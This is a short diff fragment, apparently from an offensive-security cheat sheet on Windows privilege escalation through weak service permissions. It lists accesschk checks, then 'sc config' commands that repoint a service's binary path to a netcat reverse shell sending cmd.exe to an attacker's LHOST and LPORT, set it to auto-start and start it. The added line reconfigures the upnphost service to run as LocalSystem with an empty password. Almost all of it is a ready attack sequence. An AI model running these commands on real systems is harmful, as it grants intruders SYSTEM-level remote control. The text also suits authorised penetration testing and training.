@@ -22,6 +22,7 @@ accesschk.exe /accepteula -uwcqv "Authenticated Users" * (won't yield anything o
 accesschk.exe /accepteula -ucqv <SERVICE_NAME>
 sc qc <SERVICE_NAME>
 sc config <SERVICE_NAME> binpath= "C:\<NC.EXE_PATH> -nv <LHOST> <LPORT> -e C:\WINDOWS\System32\cmd.exe"
+sc config upnphost obj= ".\LocalSystem" password= ""
 sc config <SERVICE_NAME> start= auto
 net start <SERVICE_NAME>
 
